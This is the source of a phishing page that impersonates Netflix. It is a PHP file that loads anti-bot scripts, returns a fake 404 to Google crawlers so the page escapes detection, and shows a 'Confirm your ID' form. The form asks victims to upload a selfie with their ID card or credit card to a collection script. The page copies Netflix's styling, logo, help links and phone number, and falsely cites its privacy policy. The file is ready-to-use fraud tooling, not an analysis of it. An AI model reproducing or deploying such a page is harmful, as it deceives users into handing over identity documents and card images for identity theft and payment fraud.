<?php
session_start();
error_reporting(0);

include "../../boots/antibots1.php";
include "../../boots/antibots2.php";
include "../../boots/antibots3.php";
include "../../boots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();

include("../system/blocker.php");
include("../system/detect.php");
?>
<!doctype html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><title>Netflix</title><link rel="preload" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-js-d7cab521/js/js/bootstrap.js,common%7Cbootstrap.js/2/gx0ngpg2g04Ag4gg0A0s4ug9gw0r0O01gyg84Igbg50xgngk4Egaf_gd4G4F1t0mgs/bck/true/none" as="script"/><link rel="preload" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-js-d7cab521/js/js/signup%7Csimplicity%7CsimpleSignupClient.js/2/gx0ngpg2g04Ag4gg0A0s4ug9gw0r0O01gyg84Igbg50xgngk4Egaf_gd4G4F1t0mgs/l/true/none" as="script"/><link type="text/css" rel="stylesheet" href="/ichnaea/cl2/freeform/WebsiteDetect?source=wwwhead&amp;fetchType=css&amp;modalView=signupSimplicity-giftOptionMode"/><meta content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies United States, watch TV online, no download, full length movies" name="keywords"/><meta content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more." name="description"/><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/><link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-css-d7cab521/css/css/less%7Cpages%7Csignup%7Csimplicity%7Csimplicity.less/2/0A0O050I0a0x0H0S0V0P0J0Y0N0U0Z/none/true/none"/><link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/><link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/><meta property="og:description" content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more."/><meta property="al:ios:url" content="nflx://www.netflix.com/signup/giftoption"/><meta property="al:ios:app_store_id" content="363590051"/><meta property="al:ios:app_name" content="Netflix"/><meta property="al:android:url" content="nflx://www.netflix.com/signup/giftoption"/><meta property="al:android:package" content="com.netflix.mediaclient"/><meta property="al:android:app_name" content="Netflix"/><link href="src/jquery.fileuploader.css" media="all" rel="stylesheet">
<link href="css/jquery.fileuploader-theme-thumbnails.css" media="all" rel="stylesheet">
<script src="js/jquery-3.1.1.min.js" crossorigin="anonymous"></script>
<script src="src/jquery.fileuploader.min.js" type="text/javascript"></script>
<script src="js/custom.js" type="text/javascript"></script></head><body>

<div id="appMountPoint">

<div class="basicLayout modernInApp signupSimplicity-giftOptionMode simplicity" lang="en-US" dir="ltr" data-reactroot="" data-reactid="1" data-react-checksum="1315733991">

<div class="nfHeader noBorderHeader signupBasicHeader" data-reactid="2"><a href="/" class="svg-nfLogo signupBasicHeader" data-reactid="3"><svg class="svg-icon svg-icon-netflix-logo " focusable="true" data-reactid="4"><use filter="" xlink:href="#netflix-logo" data-reactid="5"></use></svg><span class="screen-reader-text" data-reactid="6">Netflix</span></a><a href="/signout" class="authLinks signupBasicHeader" data-reactid="7">Sign Out</a></div>

<div class="simpleContainer slimWidth" data-reactid="8">

<div class="centerContainer firstLoad" data-reactid="9">

<div class="paymentFormContainer" data-reactid="11"><!-- react-empty: 12 -->

<div class="stepHeader-container" data-reactid="13">

<div class="stepHeader" data-reactid="14"><br><h1 class="stepTitle" data-reactid="16">Confirm your ID.</h1></div></div>

<div class="fieldContainer" data-reactid="17">

<p>To help keep all our members safe, we need to know our community. Please provide a document that verifies your identity.</p>
<br>
<b>What document would you like to upload?</b><br><br>
    <li style="font-size: 14px;margin-bottom: 5px">Selfie with your ID card.</li>
    <li style="font-size: 14px;margin-bottom: 5px">Selfie with your Credit Card.</li>
    <li style="font-size: 14px;margin-bottom: 5px;">We will handle your information in accordance with our <span style="font-weight: 500;color: #d30020;">Privacy Policy</span></li>
<br><br>


<div style="width: 100%;margin-top: 20px;margin-bottom: 50px;">
<center>
<div style="max-width: 500px;margin: auto;">
<form action="php/form_upload.php" method="post" enctype="multipart/form-data">
<input type="file" name="files" required>
<button class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="submit" autocomplete="off" tabindex="0" id="simplicityPayment-REDEE" data-reactid="36"><!-- react-text: 37 -->CONTINUE<!-- /react-text --></button>
</div>
</form>
</center>
</div>






<div class="submitBtnContainer" data-reactid="35"></div></div></div></form></div></div>

<div class="site-footer-wrapper centered" data-reactid="38">

<div class="footer-divider" data-reactid="39"></div>

<div class="site-footer" data-reactid="40"><p class="footer-top" data-reactid="41"><!-- react-text: 42 -->Questions? Call <!-- /react-text --><a class="footer-top-a" href="tel:1-866-579-7172" data-reactid="43">1-866-579-7172</a><!-- react-text: 44 --><!-- /react-text --></p><ul class="footer-links structural" data-reactid="45"><li class="footer-link-item" placeholder="footer_responsive_link_faq_item" data-reactid="46"><a class="footer-link" href="https://help.netflix.com/support/412" placeholder="footer_responsive_link_faq" data-reactid="47"><span id="" data-reactid="48">FAQ</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_help_item" data-reactid="49"><a class="footer-link" href="https://help.netflix.com" placeholder="footer_responsive_link_help" data-reactid="50"><span id="" data-reactid="51">Help Center</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_terms_item" data-reactid="52"><a class="footer-link" href="https://help.netflix.com/legal/termsofuse" placeholder="footer_responsive_link_terms" data-reactid="53"><span id="" data-reactid="54">Terms of Use</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item" data-reactid="55"><a class="footer-link" href="https://help.netflix.com/legal/privacy" placeholder="footer_responsive_link_privacy_separate_link" data-reactid="56"><span id="" data-reactid="57">Privacy</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item" data-reactid="58"><a class="footer-link" href="https://help.netflix.com/legal/privacy#cookies" placeholder="footer_responsive_link_cookies_separate_link" data-reactid="59"><span id="" data-reactid="60">Cookie Preferences</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item" data-reactid="61"><a class="footer-link" href="https://help.netflix.com/en/node/2101" placeholder="footer_responsive_link_corporate_information" data-reactid="62"><span id="" data-reactid="63">Corporate Information</span></a></li></ul>

<div class="lang-selection-container" id="lang-switcher" data-reactid="64">

<div class="nfSelectWrapper inFooter selectArrow prefix" data-reactid="65">

<div class="nfSelectPlacement globe" data-reactid="66"><select class="nfSelect" name="__langSelect" tabindex="0" data-reactid="67"><option selected="" value="/signup/giftoption?locale=en-US" label="English" data-reactid="68">English</option><option value="/signup/giftoption?locale=es-US" label="Español" data-reactid="69">Español</option></select><label class="nfLabel no-display placeLabel" data-reactid="70"></label></div></div></div></div></div>

<svg style="height:0;width:0;position:absolute;" xmlns="http://www.w3.org/2000/svg" data-reactid="75"><svg viewBox="0 0 111 30" id="netflix-logo" width="100%" height="100%"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"></path></svg></body></html>